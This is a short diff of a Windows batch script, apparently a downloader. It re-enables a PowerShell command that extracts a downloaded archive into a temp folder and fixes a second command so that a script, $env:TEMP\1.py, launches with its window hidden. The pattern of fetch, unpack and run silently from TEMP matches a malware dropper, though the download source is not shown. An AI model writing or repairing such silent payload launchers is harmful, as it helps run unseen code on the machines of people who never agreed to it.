@@ -12,6 +12,6 @@ for %%A in ("%output%") do (
         goto download
     )
 )
-@REM powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\1.py -WindowStyle "
+powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\1.py -WindowStyle Hidden"
 exit
